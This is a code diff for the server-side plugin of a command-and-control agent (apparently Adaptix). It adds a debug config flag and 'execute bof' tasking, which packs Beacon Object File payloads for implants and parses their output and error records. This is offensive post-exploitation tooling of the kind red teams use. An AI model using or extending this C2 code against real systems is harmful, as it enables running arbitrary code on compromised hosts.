@@ -144,6 +144,12 @@ func getFloatArg(args map[string]any, key string) (float64, error) {
 	return 0, fmt.Errorf("parameter '%s' must be a number", key)
 }
 
+// getBoolArg (native beacon_agent: absent or non-bool is simply false).
+func getBoolArg(args map[string]any, key string) bool {
+	v, _ := args[key].(bool)
+	return v
+}
+
 // Command ids on the wire (native beacon_agent, pl_utils.go).
 const (
 	COMMAND_TERMINATE = 10
@@ -165,6 +171,23 @@ const (
 	COMMAND_EXFIL      = 35
 	COMMAND_SAVEMEMORY = 0x2321
 	COMMAND_ERROR     = 0x1111ffff
+
+	// BOF execution (native pl_utils.go).
+	COMMAND_EXEC_BOF     = 50
+	COMMAND_EXEC_BOF_OUT = 51
+
+	BOF_STATE_STARTED  = 0x1
+	BOF_STATE_FINISHED = 0x2
+
+	CALLBACK_ERROR       = 0x0d
+	CALLBACK_OUTPUT_OEM  = 0x1e
+	CALLBACK_OUTPUT_UTF8 = 0x20
+
+	BOF_ERROR_PARSE     = 0x101
+	BOF_ERROR_SYMBOL    = 0x102
+	BOF_ERROR_MAX_FUNCS = 0x103
+	BOF_ERROR_ENTRY     = 0x104
+	BOF_ERROR_ALLOC     = 0x105
 
 	DOWNLOAD_START   = 0x1
 	DOWNLOAD_CONTINUE = 0x2
@@ -246,6 +269,7 @@ type sptConfig struct {
 	JitterMS    int             `json:"jitter_ms"`
 	Watermark   uint32          `json:"watermark"`
 	KillEpoch   int64           `json:"kill_epoch"`
+	Debug       bool            `json:"debug"`
 	Profile     json.RawMessage `json:"profile"`
 }
 
@@ -472,6 +496,7 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		JitterMS:    jitterMS,
 		Watermark:   uint32(watermark),
 		KillEpoch:   killEpoch,
+		Debug:       generateConfig.Debug,
 		Profile:     profileJSON,
 	}
 	cfgJSON, err := json.Marshal(cfg)
@@ -850,6 +875,37 @@ func (e *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[stri
 		}
 		array = []interface{}{COMMAND_MV, Ts.TsConvertUTF8toCp(src, agentData.ACP), Ts.TsConvertUTF8toCp(dst, agentData.ACP)}
 
+	case "execute":
+		// Port of the native `execute bof` (beacon_agent CreateCommand):
+		// base64 file content, base64 param data (raw + NUL fallback).
+		if subcommand != "bof" {
+			err = errors.New("subcommand must be 'bof'")
+			goto RET
+		}
+		taskData.Type = adaptix.TASK_TYPE_JOB
+
+		async := getBoolArg(args, "-a")
+		bofFile, _err := getStringArg(args, "bof")
+		if _err != nil {
+			err = _err
+			goto RET
+		}
+		bofContent, berr := base64.StdEncoding.DecodeString(bofFile)
+		if berr != nil {
+			err = berr
+			goto RET
+		}
+		var params []byte
+		if paramData, ok := args["param_data"].(string); ok {
+			params, err = base64.StdEncoding.DecodeString(paramData)
+			if err != nil {
+				params = []byte(paramData)
+				params = append(params, 0)
+				err = nil
+			}
+		}
+		array = []interface{}{COMMAND_EXEC_BOF, async, "go", len(bofContent), bofContent, len(params), params}
+
 	case "terminate":
 		if subcommand == "thread" {
 			array = []interface{}{COMMAND_TERMINATE, 1}
@@ -913,6 +969,11 @@ func (e *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData [
 	if size-4 != packer.Size() {
 		return errors.New("failed to unmarshal message")
 	}
+
+	// BOF output dedup (native ProcessData): the first EXEC_BOF_OUT record
+	// of a task carries the "BOF output" label, the following ones are
+	// rendered bare so the console shows one output block per BOF.
+	bofOutput := make(map[string]bool)
 
 	for packer.Size() >= 8 {
 
@@ -1300,6 +1361,136 @@ func (e *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData [
 				task.Message = fmt.Sprintf("Download '%v' successful canceled", fileId)
 				_ = Ts.TsDownloadClose(fileId, adaptix.DOWNLOAD_STATE_CANCELED)
 			}
+
+		case COMMAND_EXEC_BOF:
+			if false == packer.CheckPacker([]string{"byte"}) {
+				goto HANDLER
+			}
+			state := packer.ParseInt8()
+			if state == BOF_STATE_STARTED {
+				task.Message = "Async BOF started"
+				task.Completed = false
+			} else {
+				task.Message = "BOF finished"
+				task.Completed = true
+			}
+
+		case COMMAND_EXEC_BOF_OUT:
+			if false == packer.CheckPacker([]string{"int"}) {
+				goto HANDLER
+			}
+			outputType := packer.ParseInt32()
+
+			if outputType == BOF_ERROR_PARSE {
+				if false == packer.CheckPacker([]string{"array"}) {
+					goto HANDLER
+				}
+				_ = packer.ParseString()
+
+				task.MessageType = adaptix.MESSAGE_ERROR
+				task.Message = "BOF error"
+				task.ClearText = "Parse BOF error"
+
+			} else if outputType == BOF_ERROR_MAX_FUNCS {
+				if false == packer.CheckPacker([]string{"array"}) {
+					goto HANDLER
+				}
+				_ = packer.ParseString()
+
+				task.MessageType = adaptix.MESSAGE_ERROR
+				task.Message = "BOF error"
+				task.ClearText = "The number of functions in the BOF file exceeds 512"
+
+			} else if outputType == BOF_ERROR_ENTRY {
+				if false == packer.CheckPacker([]string{"array"}) {
+					goto HANDLER
+				}
+				_ = packer.ParseString()
+
+				task.MessageType = adaptix.MESSAGE_ERROR
+				task.Message = "BOF error"
+				task.ClearText = "Entry function not found"
+
+			} else if outputType == BOF_ERROR_ALLOC {
+				if false == packer.CheckPacker([]string{"array"}) {
+					goto HANDLER
+				}
+				_ = packer.ParseString()
+
+				task.MessageType = adaptix.MESSAGE_ERROR
+				task.Message = "BOF error"
+				task.ClearText = "Error allocation of BOF memory"
+
+			} else if outputType == BOF_ERROR_SYMBOL {
+				if false == packer.CheckPacker([]string{"array"}) {
+					goto HANDLER
+				}
+				output := packer.ParseString()
+
+				task.MessageType = adaptix.MESSAGE_ERROR
+				task.Message = "BOF error"
+				task.ClearText = "Symbol not found: " + output + "\n"
+
+			} else if outputType == CALLBACK_ERROR {
+				if false == packer.CheckPacker([]string{"array"}) {
+					goto HANDLER
+				}
+				output := packer.ParseString()
+
+				task.MessageType = adaptix.MESSAGE_ERROR
+				task.Message = "BOF output"
+				task.ClearText = Ts.TsConvertCpToUTF8(output, agentData.ACP)
+
+			} else if outputType == CALLBACK_OUTPUT_OEM {
+				if false == packer.CheckPacker([]string{"array"}) {
+					goto HANDLER
+				}
+				output := packer.ParseString()
+
+				if _, ok := bofOutput[task.TaskId]; ok {
+					task.Message = ""
+				} else {
+					bofOutput[task.TaskId] = true
+					task.Message = "BOF output"
+				}
+
+				task.MessageType = adaptix.MESSAGE_SUCCESS
+				task.ClearText = Ts.TsConvertCpToUTF8(output, agentData.OemCP)
+
+			} else if outputType == CALLBACK_OUTPUT_UTF8 {
+				if false == packer.CheckPacker([]string{"array"}) {
+					goto HANDLER
+				}
+				output := packer.ParseString()
+
+				if _, ok := bofOutput[task.TaskId]; ok {
+					task.Message = ""
+				} else {
+					bofOutput[task.TaskId] = true
+					task.Message = "BOF output"
+				}
+
+				task.MessageType = adaptix.MESSAGE_SUCCESS
+				task.ClearText = output
+
+			} else {
+				if false == packer.CheckPacker([]string{"array"}) {
+					goto HANDLER
+				}
+				output := packer.ParseString()
+
+				if _, ok := bofOutput[task.TaskId]; ok {
+					task.Message = ""
+				} else {
+					bofOutput[task.TaskId] = true
+					task.Message = "BOF output"
+				}
+
+				task.MessageType = adaptix.MESSAGE_SUCCESS
+				task.ClearText = Ts.TsConvertCpToUTF8(output, agentData.ACP) + "\n"
+			}
+
+			task.Completed = false
 
 		case COMMAND_UPLOAD:
 			task.Message = "File successfully uploaded"
